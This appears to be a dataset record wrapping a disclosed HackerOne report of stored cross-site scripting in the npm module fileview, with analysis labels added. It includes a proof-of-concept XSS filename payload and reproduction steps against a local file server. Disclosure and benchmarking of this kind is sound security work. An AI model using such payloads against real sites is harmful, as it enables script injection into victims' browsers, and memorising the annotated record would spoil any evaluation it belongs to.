{
  "reported_to": "Node.js third-party modules",
  "reported_by": "johnssimon007 ",
  "title": "[fileview] Inadequate Output Encoding and Escaping ",
  "content": "\nI would like to report stored xss in fileview module\nIt allows an attacker to embed malicious js code in filename there was no sanitization performed.\nModule\nmodule name:fileview\nversion: 0.1.6\nnpm page: https://www.npmjs.com/package/fileview\nModule Description\nFile browsers on web. It's easy to browser your local file.\nVulnerability\nVulnerability Description\nsince there was no sanitizations performed on filenames ,an attacker can include filenames with malicious js code which gets executed when browsed to the file over the web browser\nSteps To Reproduce:\n1.install fileview:\nnpm install fileview -g\n2:now create a file with xss payload as follows:\n\"><img src=x onerror=alert(\"xss\")>.jpg\n3.running below command on terminal will start a file server at port 8080\nfileview -p /root/ -P 8080\n4.now goto http://127.0.0.1:8080/\nyou will see the xss got executed\nPatch\nIf you're able to provide a patch with the fix please post it in this section\nSupporting Material/References:\nState all technical information about the stack where the vulnerability was found\n[OPERATING SYSTEM VERSION] KALI LINUX\n[NODEJS VERSION] 11.8.0\n[NPM VERSION] 6.5.0\nWrap up\nSelect Y or N for the following statements:\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nthis could have allowed an attacker to embed malicious js code in filename and executes it when victim browse to file over the web browser\n\n",
  "severity": [
    7.1,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {},
  "disclosed_date": 1577585340,
  "report_url": "https://hackerone.com/reports/507159",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Install fileview: npm install fileview -g"
    ],
    [
      2,
      "Create a file with XSS payload: \"><img src=x onerror=alert(\"xss\")>.jpg"
    ],
    [
      3,
      "Start the file server: fileview -p /root/ -P 8080"
    ],
    [
      4,
      "Access http://127.0.0.1:8080/ to observe XSS execution"
    ]
  ],
  "vuln_description": "The fileview module suffers from a stored XSS vulnerability due to inadequate output encoding and escaping of filenames. An attacker can embed malicious JavaScript code in a filename, which gets executed when a victim browses the file via the web interface.",
  "reason": "The vulnerability is straightforward to discover as it involves a common XSS attack vector (filename manipulation) and does not require complex interactions or state manipulations. The attack is simple and follows a predictable pattern of testing for lack of input sanitization.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The XSS vulnerability in the fileview module involves output encoding and escaping issues, not authentication or authorization. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are unrelated to XSS vulnerabilities that arise from inadequate sanitization of user-supplied input (filenames in this case).",
    "is_detectable": false
  }
}